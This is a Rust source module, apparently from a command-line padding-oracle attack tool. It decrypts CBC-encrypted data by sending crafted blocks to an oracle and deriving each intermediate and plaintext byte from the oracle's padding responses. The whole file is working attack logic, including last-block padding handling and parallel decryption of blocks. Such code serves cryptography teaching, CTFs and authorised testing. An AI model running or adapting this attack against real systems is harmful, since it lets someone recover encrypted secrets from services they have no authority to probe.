use crate::error::{ BraveOracle, CharLoad, HexParse, InsufficiendChars };
use crate::{ Result, CmdOracle, PrioQueue, Messages, ProgressMsg };

use std::sync::mpsc::Sender;
use std::fs;

use snafu::{ ResultExt, ensure };
use futures::future;

#[derive(Debug)]
struct Dec {
    pub intermediate: Vec<u8>,
    pub plain: Vec<u8>
}

impl Dec {
    pub fn new(intermediate: Vec<u8>, plain: Vec<u8>) -> Self {
        Dec { intermediate, plain }
    }
}

type DecResult = Result<Dec>;

async fn decrypt_blk<'a>(blk: &[u8],
                                  last: &[u8],
                                  oracle: &CmdOracle<'a>,
                                  chars: &PrioQueue,
                                  prog: &Sender<Messages>,
                                  block: usize,
                                  is_last: bool) -> DecResult {
    let blksz = blk.len();
    let mut intermediate = vec![0; blksz];
    let mut plain = vec![0u8; blksz];
    let mut payload = vec![0; blksz * 2];
    payload[blksz..].copy_from_slice(blk);
    let mut end = 0;
    // TODO this code is fucking disgusting and i should feel ashamed of myself
    if is_last {
        for b in 1..blksz +1 {
            payload[blksz -1] = b as u8 ^ (1 ^ last[blksz -1]);
            //println!("trying pad {}", b);
            if oracle.request(&payload).await? {
                //println!("found pad byte: {}", b);
                for i in blksz - b .. blksz {
                    intermediate[i] = b as u8 ^ last[i];
                    plain[i] = b as u8;
                }
                end = b;
                break;
            }
        }
    }
    for i in (0..blksz - end).rev() {
        let pad = (blksz - i) as u8;
        (i +1..blksz).rev().for_each(|j| payload[j] = pad ^ intermediate[j]);

        let mut took = 0;
        for (j, b) in chars.iter().enumerate() {
            payload[i] = b ^ (pad ^ last[i]);
            prog.send(Messages::Prog(ProgressMsg::new(payload[0..blksz].to_vec(), i as u8, block)))
                .unwrap();
            if oracle.request(&payload).await? {
                intermediate[i] = b ^ last[i];
                plain[i] = b;
                took = j;
                chars.hit(b);
                break;
            }
        }
        //println!("oracle took {} tries", took);
        ensure!(took != 255, BraveOracle);
    }
    prog.send(Messages::Done()).unwrap();
    Ok(Dec::new(intermediate, plain))
}

async fn decrypt<'a>(cipher: &[u8],
                     blksz: usize,
                     oracle: &CmdOracle<'a>,
                     prog: Sender<Messages>,
                     chars: [u8; 256],
                     iv: bool) -> Vec<DecResult> {
    let mut blocks = cipher.chunks(blksz).collect::<Vec<&[u8]>>();
    let ivblk: Vec<u8>;
    if !iv {
        ivblk = vec![0; blksz];
        blocks.insert(0, &ivblk);
    }

    let chars  = PrioQueue::new(chars.to_vec());
    // println!("sorted prio: {:?}", chars.iter().collect::<Vec<u8>>());
    let res = future::join_all(blocks
        .iter()
        .skip(1)
        .zip(blocks[0..blocks.len() -1].iter())
        .enumerate()
        .map(|(i, (blk1, blk2))| decrypt_blk(blk1, blk2, oracle, &chars, &prog, i,
                                             i == blocks.len() -2 && iv)))
        .await;

    //println!("{:x?}", chars.iter().collect::<Vec<u8>>());
    res
}

